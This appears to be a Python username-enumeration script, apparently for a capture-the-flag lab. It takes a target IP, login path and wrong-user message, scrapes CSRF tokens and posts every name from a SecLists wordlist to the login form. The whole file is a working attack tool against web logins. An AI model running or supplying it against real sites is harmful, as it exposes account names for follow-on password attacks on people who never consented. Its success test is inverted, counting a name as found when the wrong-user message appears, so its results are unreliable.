import re 
import requests
from urllib.parse import urljoin
import time
import sys

target = input("Target IP: ")
host = input("Host Site: ")
path = '/login.php'
print()
print("Path: ", path)
change_path = input("Change Path y/n: ")
if change_path == "y":
    path = input("New Path: ")
status_code = "200"
print()
print("Status Code: ", status_code)
change_code = input("Change Code y/n:" )
if change_code == "y":
    status_code = input("New Status Code")
user_path = "/usr/share/wordlists/SecLists/Usernames/Names/names.txt" 
print()
print("Default User Path: ", user_path)
change_path = input("Change Path y/n: ")
if change_path == "y":
    user_path = input("New User path: ")
Wrong_user = input("Wrong User Message: ")
userfield = "username"
passfield = "password"


print("Now Attempting To Login...")
successes = []

def find_csrf(html):
    #print("Creating Session...")
    m = re.search(r'<input[^>]+name=["\']?(csrf_token|csrf|token|_csrf)["\']?[^>]+value=["\']([^"\']+)["\']', html, re.I)
    return (m.group(1), m.group(2)) if m else (None, None)
    
base = f"http://{target}:80"
login_url = urljoin(base, path.lstrip('/'))
sess = requests.Session()
sess.headers.update({"Host": host, "User-Agent": "ctf-script/1.0"})

with open(user_path, "r") as f:
    fidata = f.read()
    text = fidata.split()
    for word in text:
        r = sess.get(login_url, timeout=10)
        csrf_name, csrf_value = find_csrf(r.text)
        data = {userfield: word, passfield: "x"}
        if csrf_name: data[csrf_name] = csrf_value
        r2 = sess.post(login_url, data=data, allow_redirects=False, timeout=10)

        status = r2.status_code
        if "Location" in r2.headers:
            print(" Redirect ->", r2.headers["Location"])
        if Wrong_user in r2.text:
            successes.append(word)
            print("Username: ", word, " : [SUCCESS]")
        else:    
            print("Username", word, ": [FAILED]")
        time.sleep(0.3)

print("Successful Usernames:", successes)